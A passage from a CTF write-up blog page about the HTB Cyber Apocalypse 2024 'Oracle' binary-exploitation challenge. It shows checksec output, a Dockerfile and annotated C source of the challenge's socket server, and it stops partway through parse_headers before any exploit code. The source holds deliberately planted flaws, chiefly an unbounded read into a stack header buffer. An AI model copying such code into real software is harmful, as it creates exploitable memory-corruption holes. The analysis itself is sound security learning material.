<!doctype html><html lang="en"><head><title>Oracle | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="HTB CA 2024. 64-bit binary. Heap exploitation. Buffer Overflow. ROP"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="HTB CA 2024. 64-bit binary. Heap exploitation. Buffer Overflow. ROP"><meta itemprop="keywords" content><meta itemprop="name" content="Oracle"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="HTB CA 2024. 64-bit binary. Heap exploitation. Buffer Overflow. ROP"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Oracle"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/oracle/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="HTB CA 2024. 64-bit binary. Heap exploitation. Buffer Overflow. ROP"><meta name="twitter:description" content="HTB CA 2024. 64-bit binary. Heap exploitation. Buffer Overflow. ROP"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Oracle"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tachyons@4.12.0/css/tachyons.min.css" integrity="sha256-MgEf5i1a74lVzhT+1R6mBbWCUeUaxC8sQTaN5GY+CoI=" crossorigin="anonymous"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/oracle/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><script>alert("Buy me a beer plz")</script><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/other/htb-cyber-apocalypse/oracle/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB CYBER APOCALYPSE</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/oracle/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/oracle/&amp;text=Oracle" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/oracle/&amp;title=Oracle" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Oracle</h1><p class="mb4 f6 dib tracked">12 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#source-code-analysis">Source code analysis</a></li><li><a href="#exploit-strategy">Exploit strategy</a></li><li><a href="#exploit-development">Exploit development</a></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given a 64-bit binary called <code>oracle</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little  
RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
Stack:    <span class="code-dark-ref">No canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-green">PIE enabled</span>
</code></pre></div><p>We also have a <code>Dockerfile</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">FROM</span><span class="mtk1"> ubuntu:20.04</span>

<span class="mtk5">RUN</span><span class="mtk1"> useradd -m ctf</span>

<span class="mtk5">COPY</span><span class="mtk1"> challenge/* /home/ctf/</span>

<span class="mtk5">RUN</span><span class="mtk1"> chown -R ctf:ctf /home/ctf/</span>  

<span class="mtk5">WORKDIR</span><span class="mtk1"> /home/ctf</span>
<span class="mtk5">USER</span><span class="mtk1"> ctf</span>

<span class="mtk5">EXPOSE</span><span class="mtk1"> 9001</span>
<span class="mtk5">CMD</span><span class="mtk1"> [</span><span class="mtk4">"./run.sh"</span><span class="mtk1">]</span>
</code></pre></div><h2 id="source-code-analysis">Source code analysis</h2><p>This time, we are given the source code of the program in C. It is quite large, so I will only put the relevant parts.</p><p>The <code>main</code> function shows that the program is a server that accepts connections from clients:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">int</span><span class="mtk1"> server_socket </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">socket</span><span class="mtk1">(AF_INET, SOCK_STREAM, </span><span class="mtk6">0</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (server_socket </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"Failed to create socket!"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk8">exit</span><span class="mtk1">(EXIT_FAILURE);</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk3">// Set up the server address struct</span>
<span class="mtk1">    </span><span class="mtk7 mtki">struct</span><span class="mtk1"> sockaddr_in server_address;</span>
<span class="mtk1">    server_address.sin_family </span><span class="mtk5">=</span><span class="mtk1"> AF_INET;</span>
<span class="mtk1">    server_address.sin_addr.s_addr </span><span class="mtk5">=</span><span class="mtk1"> INADDR_ANY;</span>
<span class="mtk1">    server_address.sin_port </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">htons</span><span class="mtk1">(PORT);</span>

<span class="mtk1">    </span><span class="mtk3">// Bind the socket to the specified address and po</span><span class="mtk3">rt</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">bind</span><span class="mtk1">(server_socket, (</span><span class="mtk7 mtki">struct</span><span class="mtk1"> sockaddr</span><span class="mtk5">*</span><span class="mtk1">)</span><span class="mtk5">&amp;</span><span class="mtk1">server_address, </span><span class="mtk5">sizeof</span><span class="mtk1">(server_address)) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">) {</span>  
<span class="mtk1">        </span><span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"Socket binding failed"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk8">close</span><span class="mtk1">(server_socket);</span>
<span class="mtk1">        </span><span class="mtk8">exit</span><span class="mtk1">(EXIT_FAILURE);</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk3">// Listen for incoming connections</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">listen</span><span class="mtk1">(server_socket, </span><span class="mtk6">5</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"Socket listening failed"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk8">close</span><span class="mtk1">(server_socket);</span>
<span class="mtk1">        </span><span class="mtk8">exit</span><span class="mtk1">(EXIT_FAILURE);</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Oracle listening on port </span><span class="mtk6">%d\n</span><span class="mtk4">"</span><span class="mtk1">, PORT);</span>

<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">        client_socket </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">accept</span><span class="mtk1">(server_socket, </span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk6">NULL</span><span class="mtk1">);</span>

<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Received a spiritual connection..."</span><span class="mtk1">);</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (client_socket </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"Socket accept failed"</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk5">continue</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk8">handle_request</span><span class="mtk1">();</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Once a connection arrives on port 9001, the server executes <code>handle_request</code>. Notice that this is a blocking server, because it doesn&rsquo;t handle each client on a separated thread or process. Moreover, the connection is never closed.</p><p>This is <code>handle_request</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">handle_request</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk3">// take in the start-line of the request</span>
<span class="mtk1">    </span><span class="mtk3">// contains the action, the target competitor and </span><span class="mtk3">the oracle version</span>
<span class="mtk1">    </span><span class="mtk7 mtki">char</span><span class="mtk1"> start_line[MAX_START_LINE_SIZE];</span>

<span class="mtk1">    </span><span class="mtk7 mtki">char</span><span class="mtk1"> byteRead;</span>
<span class="mtk1">    </span><span class="mtk7 mtki">ssize_t</span><span class="mtk1"> i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> (</span><span class="mtk7 mtki">ssize_t</span><span class="mtk1"> i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">&lt;</span><span class="mtk1"> MAX_START_LINE_SIZE; i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">recv</span><span class="mtk1">(client_socket, </span><span class="mtk5">&amp;</span><span class="mtk1">byteRead, </span><span class="mtk5">sizeof</span><span class="mtk1">(byteRead), </span><span class="mtk6">0</span><span class="mtk1">);</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (start_line[i</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\r</span><span class="mtk4">'</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> byteRead </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">) {</span>
<span class="mtk1">            start_line[i</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>
<span class="mtk1">            </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>

<span class="mtk1">        start_line[i] </span><span class="mtk5">=</span><span class="mtk1"> byteRead;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk8">sscanf</span><span class="mtk1">(start_line, </span><span class="mtk4">"</span><span class="mtk6">%7s</span><span class="mtk4"> </span><span class="mtk6">%31s</span><span class="mtk4"> </span><span class="mtk6">%15s</span><span class="mtk4">"</span><span class="mtk1">, action, target_competitor, version);</span>  
<span class="mtk1">    </span><span class="mtk8">parse_headers</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk3">// handle the specific action desired</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk8">strcmp</span><span class="mtk1">(action, VIEW)) {</span>
<span class="mtk1">        </span><span class="mtk8">handle_view</span><span class="mtk1">();</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk8">strcmp</span><span class="mtk1">(action, PLAGUE)) {</span>
<span class="mtk1">        </span><span class="mtk8">handle_plague</span><span class="mtk1">();</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"ERROR: Undefined action!"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk8">write</span><span class="mtk1">(client_socket, BAD_REQUEST, </span><span class="mtk8">strlen</span><span class="mtk1">(BAD_REQUEST));</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk3">// clear all request-specific values for next requ</span><span class="mtk3">est</span>
<span class="mtk1">    </span><span class="mtk8">memset</span><span class="mtk1">(action, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">8</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">memset</span><span class="mtk1">(target_competitor, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">32</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">memset</span><span class="mtk1">(version, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">16</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">memset</span><span class="mtk1">(headers, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk5">sizeof</span><span class="mtk1">(headers));</span>
<span class="mtk1">}</span>
</code></pre></div><p>This function starts reading into <code>start_line</code>, which is a 1024-byte buffer. This line is a string composed of <code>action</code>, <code>target_competitor</code> and <code>version</code>, separated by whitespaces. It is similar to an HTTP request line (<code>GET /path HTTP/1.1</code>).</p><p>The way to read information from the socket is interesting, because it reads one byte at a time and stops reading when it finds <code>\r\n</code> or the <code>for</code> loop reaches the maximum size of the buffer.</p><p>Then we have <code>parse_headers</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">parse_headers</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk3">// first input all of the header fields</span>
<span class="mtk1">    </span><span class="mtk7 mtki">ssize_t</span><span class="mtk1"> i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk7 mtki">char</span><span class="mtk1"> byteRead;</span>
<span class="mtk1">    </span><span class="mtk7 mtki">char</span><span class="mtk1"> header_buffer[MAX_HEADER_DATA_SIZE];</span>

<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">recv</span><span class="mtk1">(client_socket, </span><span class="mtk5">&amp;</span><span class="mtk1">byteRead, </span><span class="mtk5">sizeof</span><span class="mtk1">(byteRead), </span><span class="mtk6">0</span><span class="mtk1">);</span>

<span class="mtk1">        </span><span class="mtk3">// clean up the headers by removing extraneous new</span><span class="mtk3">lines</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">(byteRead </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> header_buffer[i</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">] </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\r</span><span class="mtk4">'</span><span class="mtk1">))</span>
<span class="mtk1">            header_buffer[i] </span><span class="mtk5">=</span><span class="mtk1"> byteRead;</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk8">strncmp</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">header_buffer[i</span><span class="mtk5">-</span><span class="mtk6">3</span><span class="mtk1">], </span><span class="mtk4">"</span><span class="mtk6">\r\n\r\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">4</span><span class="mtk1">)) {</span>
<span class="mtk1">            header_buffer[i</span><span class="mtk5">-</span><span class="mtk6">4</span><span class="mtk1">] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>
<span class="mtk1">            </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>

<span class="mtk1">        i</span><span class="mtk5">++</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk3">// now parse the headers</span>
<span class="mtk1">    </span><span class="mtk5">const</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">delim </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk6">\r\n</span><span class="mtk4">"</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">line </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strtok</span><span class="mtk1">(header_buffer, delim);</span>

<span class="mtk1">    </span><span class="mtk7 mtki">ssize_t</span><span class="mtk1"> num_headers </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> (line </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> num_headers </span><span class="mtk5">&lt;</span><span class="mtk1"> MAX_HEADERS) {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">colon </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strchr</span><span class="mtk1">(line, </span><span class="mtk4">':'</span><span class="mtk1">);</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (colon </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>
<span class="mtk1">            </span><span class="mtk5">*</span><span class="mtk1">colon </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>

<span class="mtk1">            </span><span class="mtk8">strncpy</span><span class="mtk1">(headers[num_headers].key, line, MAX_HEADER_LENGTH</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk8">strncpy</span><span class="mtk1">(headers[num_headers].value, colon</span><span class="mtk5">+</span><span class="mtk6">2</span><span class="mtk1">, MAX_HEADER_LENGTH);</span><span class="mtk3">        // colon+2 to remove whitespace</span>  
<span class="mtk1">            </span>
<span class="mtk1">            num_headers</span><span class="mtk5">++</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>

<span class="mtk1">        line </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strtok</span><span class="mtk1">(</span><span class="mtk6">NULL</span><span class="mtk1">, delim);</span>
